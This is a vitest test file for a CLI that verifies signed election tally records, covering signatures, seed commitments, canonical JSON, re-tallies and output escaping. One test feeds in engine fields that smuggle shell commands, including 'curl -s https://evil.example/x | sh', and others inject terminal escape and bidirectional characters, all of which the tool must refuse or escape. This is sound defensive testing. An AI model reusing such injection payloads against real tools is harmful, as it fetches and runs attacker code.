import { generateKeyPairSync, sign } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { canonicalBytes, canonicalize } from '../canonical-json.js';
import { seedCommitment } from '../draw.js';
import { ENGINE } from '../engine.js';
import { createRecord } from '../record.js';
import { resultsFile } from '../results.js';
import { SEED } from '../test-support/ballots.js';
import { readFixture } from '../test-support/published.js';
import type { Ballot, ElectionDefinition } from '../types.js';
import { main } from './main.js';

const { privateKey, publicKey } = generateKeyPairSync('ec', { namedCurve: 'P-256' });
const otherKey = generateKeyPairSync('ec', { namedCurve: 'P-256' }).publicKey;
const pem = (key: typeof publicKey) => key.export({ type: 'spki', format: 'pem' });

const election = readFixture<ElectionDefinition>('primary-2019', 'election.json');
const ballots = readFixture<Ballot[]>('primary-2019', 'ballots.json');
const PUBLISHED = ['--seed-commitment', seedCommitment(SEED)];

const record = (list: Ballot[] = ballots, seed = SEED) =>
  createRecord({ election, ballots: list, seed, seedCommitment: seedCommitment(seed) });

function signed(document: object) {
  return {
    record: document,
    signature: {
      algorithm: 'ecdsa-p256-sha256',
      value: sign('sha256', canonicalBytes(document), privateKey).toString('base64'),
    },
  };
}

/** Runs the CLI over in-memory files. Objects are written as a record writer must: RFC 8785. */
function run(argv: string[], files: Record<string, unknown>) {
  const lines: string[] = [];
  const code = main(argv, {
    readFile: (path) => {
      const content = files[path];
      if (content === undefined) throw new Error(`ENOENT: ${path}`);
      return typeof content === 'string' ? content : `${canonicalize(content)}\n`;
    },
    out: (line) => lines.push(line),
    err: (line) => lines.push(line),
  });
  return { code, text: lines.join('\n') };
}

const verify = (envelope: unknown, key = pem(publicKey), extra: string[] = PUBLISHED) =>
  run(['verify', 'record.json', '--public-key', 'key.pem', ...extra], {
    'record.json': envelope,
    'key.pem': key,
  });

describe('ustp-tally verify', () => {
  it('verifies a signed record of the 2019 primary end to end', () => {
    const { code, text } = verify(signed(record()));
    expect(text).toMatch(/^pass +signature /m);
    expect(text).toMatch(/^info +tally hash +sha256:[0-9a-f]{64}$/m);
    expect(text).toMatch(/^pass +seed +the revealed seed matches the published commitment/m);
    expect(text).toMatch(/^pass +ballot order +312 cast vote records/m);
    expect(text).toMatch(/^pass +engine /m);
    expect(text).toMatch(/^pass +re-tally +1 of 1 contests/m);
    expect(text).toMatch(/^Verified\.$/m);
    expect(code).toBe(0);
  });

  it('never reports verified without the published seed commitment', () => {
    const { code, text } = verify(signed(record()), pem(publicKey), []);
    expect(text).toMatch(/^WARN +seed +.*agrees with itself/m);
    expect(text).toMatch(/^pass +re-tally /m);
    expect(text).toMatch(/^NOT verified: nothing failed, but the seed could not be checked/m);
    expect(text).not.toMatch(/^Verified/m);
    expect(code).toBe(3);
  });

  it('fails a seed picked after the published commitment', () => {
    // An operator who holds the signing key re-picks the seed after seeing ballots.
    const repicked = verify(signed(record(ballots, 'b'.repeat(64))));
    expect(repicked.text).toMatch(/^FAIL +seed /m);
    expect(repicked.code).toBe(1);
  });

  it('checks a signed results file as far as public data allows', () => {
    const { code, text } = verify(signed(resultsFile(record())));
    expect(text).toMatch(/^pass +signature /m);
    expect(text).toMatch(/^info +results hash +sha256:[0-9a-f]{64}$/m);
    expect(text).toMatch(/^pass +seed /m);
    expect(text).toMatch(/^pass +engine /m);
    expect(text).toMatch(/^pass +consistency /m);
    expect(text).toMatch(/^WARN +re-tally +.*auditor tier/m);
    expect(text).toMatch(/^NOT verified: nothing failed, but the re-tally could not be checked/m);
    expect(code).toBe(3);
  });

  it('fails a signed results file whose ballot count disagrees with its results', () => {
    const file = resultsFile(record());
    file.ballots = 313;
    const { code, text } = verify(signed(file));
    expect(text).toMatch(/^FAIL +consistency /m);
    expect(code).toBe(1);
  });

  it('refuses a file that is not in RFC 8785 form, such as one with a duplicate key', () => {
    const text = `${canonicalize(signed(record()))}\n`;
    // A forged "tally" before the real one: JSON.parse keeps the last, a reader sees the first.
    const forged = text.replace('"tally":', '"tally":{"forged":true},"tally":');
    const duplicate = run(['verify', 'r.json', '--public-key', 'k.pem'], {
      'r.json': forged,
      'k.pem': pem(publicKey),
    });
    expect(duplicate.text).toMatch(/^FAIL +format +.*RFC 8785/m);
    expect(duplicate.text).not.toMatch(/^Verified/m);
    expect(duplicate.code).toBe(1);
    const pretty = run(['verify', 'r.json', '--public-key', 'k.pem'], {
      'r.json': JSON.stringify(JSON.parse(text), null, 2),
      'k.pem': pem(publicKey),
    });
    expect(pretty.code).toBe(1);
  });

  it('fails a re-counted forgery on its signature', () => {
    const genuine = signed(record());
    const forged = ballots.map((b) => structuredClone(b));
    forged[0]!.contests.president = ['haywire'];
    const { code, text } = verify({ record: record(forged), signature: genuine.signature });
    expect(text).toMatch(/^FAIL +signature /m);
    expect(text).toMatch(/^pass +re-tally /m);
    expect(text).toMatch(/^NOT verified\./m);
    expect(code).toBe(1);
  });

  it('fails a genuinely signed record whose published result is wrong, and shows the difference', () => {
    const r = record();
    const round7 = r.tally.results.contests[0];
    if (round7?.method !== 'instant-runoff') throw new Error();
    round7.rounds[6]!.tallies[0]!.votes = 161;
    const { code, text } = verify(signed(r));
    expect(text).toMatch(/^pass +signature /m);
    expect(text).toMatch(/^FAIL +re-tally /m);
    expect(text).toContain(
      'tally.results.contests[0].rounds[6].tallies[0].votes: expected 161, found 160',
    );
    expect(code).toBe(1);
  });

  it('fails a record signed by another key', () => {
    const { code, text } = verify(signed(record()), pem(otherKey));
    expect(text).toMatch(/^FAIL +signature /m);
    expect(code).toBe(1);
  });

  it('fails a record that is not a valid election record', () => {
    const envelope = signed(record());
    const { code, text } = verify({ ...envelope, record: { ...envelope.record, extra: true } });
    expect(text).toMatch(/^FAIL +record +record\.extra: is not a known field/m);
    expect(code).toBe(1);
  });

  it('shows the build hash a record names, for comparison with the registry', () => {
    const r = record();
    const integrity = `sha512-${'A'.repeat(86)}==`;
    r.tally.engine = { ...ENGINE, integrity };
    const { text } = verify(signed(r));
    expect(text).toContain(
      `info  build hash   ${integrity}; compare: npm view ustp-tally@${ENGINE.version} dist.integrity`,
    );
  });

  it('refuses engine fields that could smuggle a shell command into the compare line', () => {
    for (const engine of [
      {
        ...ENGINE,
        version:
          '0.1.0 dist.integrity; curl -s https://evil.example/x | sh; npm view ustp-tally@0.1.0',
      },
      { ...ENGINE, name: 'ustp-tally; sh' },
      { ...ENGINE, integrity: 'sha512-AAAA; sh' },
    ]) {
      const r = record();
      r.tally.engine = engine;
      const { code, text } = verify(signed(r));
      expect(text).toMatch(/^FAIL +record +record\.tally\.engine\./m);
      expect(text).not.toContain('curl');
      expect(text).not.toContain('npm view');
      expect(code).toBe(1);
    }
  });

  it('never prints control or bidirectional characters taken from the record', () => {
    const r = record();
    const escape = String.fromCharCode(0x1b);
    const override = String.fromCodePoint(0x202e);
    const backslash = String.fromCharCode(92);
    const contest = r.tally.results.contests[0];
    if (contest?.method !== 'instant-runoff') throw new Error();
    contest.winner = `haywire${escape}[2J${override}`;
    const { text } = verify(signed(r));
    expect(text.includes(escape)).toBe(false);
    expect(text.includes(override)).toBe(false);
    expect(text).toContain(`expected "haywire${backslash}u001b[2J${backslash}u202e"`);
  });

  it('refuses a key that is not ECDSA P-256', () => {
    const ed = generateKeyPairSync('ed25519').publicKey;
    const { code, text } = verify(signed(record()), pem(ed));
    expect(text).toContain('must be an ECDSA P-256 public key');
    expect(code).toBe(2);
  });

  it('explains usage and unreadable input', () => {
    expect(run([], {}).code).toBe(2);
    expect(run(['verify', 'record.json'], {}).text).toContain('Usage:');
    expect(run(['tally'], {}).code).toBe(2);
    const missing = run(['verify', 'nope.json', '--public-key', 'key.pem'], {});
    expect(missing.code).toBe(2);
    expect(missing.text).toContain('nope.json');
    const notJson = run(['verify', 'r.json', '--public-key', 'k.pem'], {
      'r.json': '{',
      'k.pem': pem(publicKey),
    });
    expect(notJson.code).toBe(2);
    const badCommitment = verify(signed(record()), pem(publicKey), ['--seed-commitment', 'xyz']);
    expect(badCommitment.code).toBe(2);
  });

  it('prints its version', () => {
    expect(run(['--version'], {})).toEqual({ code: 0, text: `${ENGINE.name} ${ENGINE.version}` });
  });
});
